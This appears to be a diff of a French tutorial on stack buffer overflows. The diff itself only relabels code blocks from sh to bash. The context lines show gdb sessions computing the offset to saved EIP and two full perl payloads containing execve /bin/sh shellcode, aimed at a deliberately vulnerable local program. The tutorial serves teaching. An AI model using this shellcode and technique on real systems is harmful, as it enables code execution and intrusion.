@@ -90,7 +90,7 @@ Voici un programme qui prend en entrée un argument (qui sera une string, ou plu
 
 Très bien compilons-le et testons le :
 
-```sh
+```bash
 hackndo@hackndo:~$ gcc binary.c -o binary
   
 hackndo@hackndo:~$ ./binary AAA
@@ -110,7 +110,7 @@ Après compilation, nous avons donc lancé notre programme en lui passant dans u
 
 Tentons de comprendre pourquoi, en suivant pas à pas le fonctionnement du programme lors de son exécution. Voici les instructions assembleur des deux fonctions
 
-```sh
+```bash
 # Fonction main
 (gdb) disass main
 Dump of assembler code for function main:
@@ -158,7 +158,7 @@ Ensuite, à l'adresse `0x08048407` se trouve l'appel système pour copier le con
 
 Pour pouvoir suivre l'exécution du code, nous allons placer des breakpoints à des endroits stratégiques pour que je puisse vous faire comprendre le fonctionnement. Vous comprendrez pourquoi ces endroits sont intéressants, puisqu'à chaque breakpoint je vous expliquerai son apport
 
-```sh
+```bash
 (gdb) break *0x08048441 # Avant func, dans main
 Breakpoint 1 at 0x8048441
 (gdb) break *0x080483f7 # Avant réservation mémoire pour le buffer
@@ -179,7 +179,7 @@ Breakpoint 5 at 0x8048418
 
 C'est parti, il est temps d'exécuter le code. Pour cela, je vais envoyer un argument de longueur 78. Il y a une bonne raison, et vous allez la comprendre au fil de cet exemple.
 
-```sh
+```bash
 (gdb) run `perl -e 'print "A"x78'`
 Starting program: /tmp/hackndo/binary `perl -e 'print "A"x78'`
 Breakpoint 1, 0x08048441 in main ()
@@ -232,7 +232,7 @@ Enfin, nous voyons que le début du stackframe de la fonction `main` est situé 
 
 Ok, tout est bon, on passe à la suite !
 
-```sh
+```bash
 (gdb) continue
 Continuing.
 Breakpoint 2, 0x080483f7 in func ()
@@ -273,7 +273,7 @@ J'ai affiché les valeurs des trois registres, et lorsqu'on affiche les 4 valeur
 
 À la suite !
 
-```sh
+```bash
 (gdb) continue
 Continuing.
 Breakpoint 3, 0x080483fa in func ()
@@ -325,7 +325,7 @@ C'est un peu plus clair ? Essayez de reprendre mes explications avec ce schéma 
 
 Un peu de mathématiques font que nous avons finalement un décalage total de 88 octets, ce qui signifie qu'il y un décalage de 22 `quadri-octets` appelés `word` (taille d'une adresse). Donc si nous avons un décalage de 22 `words`, et que nous affichons les 24 premiers éléments de la pile, nous devrions retomber sur nos pattes et trouver en dernières positions notre sauvegarde de `EBP` et `EIP`.
 
-```sh
+```bash
 (gdb) x/24xw $esp
 0xbffffbf0:    0xb7fffa54    0x00000000    0xb7fe1b48    0x00000001
 0xbffffc00:    0x00000000    0x00000001    0xb7fff8f8    0xb7fd6ff4
@@ -339,7 +339,7 @@ Un peu de mathématiques font que nous avons finalement un décalage total de 88
 
 Et c'est le cas ! La fin de la dernière ligne contient bien les deux adresses escomptées `sEBP` et `sEIP`. Les 72 octets qui précèdent sont prévus pour le buffer, et les 16 premiers pour l'appel à `strcpy`.
 
-```sh
+```bash
 (gdb) c
 Continuing.
 
@@ -386,7 +386,7 @@ Mais rappelez-vous, nous n'avions prévu qu'un buffer de 64 octets, et nous lui 
 
 Si ce débordement de buffer (buffer overflow) ne dérange pas le processeur dans l'immédiat, il va se trouver embêter lorsqu'il devra réutiliser la valeur sauvegardée de `EIP` pour pouvoir reprendre le cours de son exécution.
 
-```sh
+```bash
 (gdb) continue
 Continuing.
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -436,7 +436,7 @@ Ces caractères doivent se finir par le shellcode (ce n'est pas obligatoire, mai
 
 Enfin, pour trouver l'adresse qui écrasera la sauvegarde de EIP, rappelons-nous l'état de la stack :
 
-```sh
+```bash
 (gdb) x/24xw $esp
 0xbffffbf0:    0xbffffc00    0xbffffe35    0xb7fe1b48    0x00000001
 0xbffffc00:    0x41414141    0x41414141    0x41414141    0x41414141
@@ -462,7 +462,7 @@ print "\x90"x31 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\
 
 En le lançant dans gdb, on obtient alors le résultat suivant :
 
-```sh
+```bash
 (gdb) run `perl -e 'print "\x90"x31 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x10\xfc\xff\xbf"'`
 Starting program: /tmp/hackndo/binary `perl -e 'print "\x90"x31 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x10\xfc\xff\xbf"'`
 ��������������������������������^�1�F�F
@@ -506,7 +506,7 @@ Ce programme est presque similaire au programme précédant, cependant cette foi
 
 Pour en être sûr, étudions le nouveau code assembleur associé à ce programme
 
-```sh
+```bash
 (gdb) disass main
 Dump of assembler code for function main:
    0x08048419 <+0>:     push   ebp
@@ -557,7 +557,7 @@ Le pool de `NOP` (`\x9`0) n'est là que pour 'assurer' le coup, il n'est pas né
 
 Les premières étapes du cas 1 sont toujours valables. Refaisons notre petit calcul. On voit dans les instructions assembleur que 0x10 octets (donc 16) sont réservés pour le buffer pour `strcpy`. Si nous ajoutons la taille de `EBP`, cela fait 20 octets. On peut vérifier ce calcul simplement en envoyant une chaine de 22 caractères, et en vérifiant que `EIP` a été écrasé à moitié :
 
-```sh
+```bash
 (gdb) run `perl -e 'print "A"x22'`
 Starting program: /tmp/hackndo/binary `perl -e 'print "A"x22'`
 AAAAAAAAAAAAAAAAAAAAAA
@@ -578,7 +578,7 @@ Nous voyons que le programme a tenté d'accéder à l'adresse mémoire 0x0800414
 
 Pour connaitre l'adresse de la sauvegarde de `EIP` (et donc l'adresse qui suit), faisons un breakpoint juste après que `EIP` est poussé sur la pile, c'est à dire à la première instruction de `func` et regardons la valeur de `ESP`.
 
-```sh
+```bash
 (gdb) break *0x080483f4
 Breakpoint 1 at 0x80483f4
 (gdb) run `perl -e 'print "A"x69'`
@@ -615,7 +615,7 @@ print "A"x20 . "\x50\xfc\xff\xbf" . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x0
 
 Donc dans gdb, quand on envoie :
 
-```sh
+```bash
 (gdb) run `perl -e 'print "A"x20 . "\x50\xfc\xff\xbf" . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
 
 Starting program: /tmp/hackndo/binary `perl -e 'print "A"x20 . "\x50\xfc\xff\xbf" . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
